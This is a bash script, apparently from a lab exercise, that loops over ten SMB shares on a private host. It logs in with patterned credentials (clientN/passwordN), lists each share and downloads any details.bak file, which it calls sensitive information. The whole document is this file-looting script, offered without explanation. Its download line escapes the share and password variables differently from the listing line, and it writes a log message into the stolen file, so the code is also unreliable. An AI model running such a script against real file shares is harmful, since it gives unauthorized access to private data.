for clients in {1..10}
do
# Series of smbclient commands to list and retrieve all files from directory
bash -c "smbclient //192.168.40.5/Sambaclient$clients -U 'client$clients%password$clients' -c 'ls' -m SMB3"

if bash -c "smbclient //192.168.40.5/Sambaclient$clients -U 'client$clients%password$clients' -c 'ls' -m SMB3" | grep details.bak
then 
    echo "Found sensitive information on client$clients!"
    echo "Retrieving the sensitive information!"
    smbclient //192.168.40.5/Sambaclient\$clients -U "client$clients%password\$clients" -m SMB3 -c "get details.bak"
    echo "Retreived sensitive information from Sambaclient$clients" >> details.bak 
else
    echo "Nothing here..."
fi
done
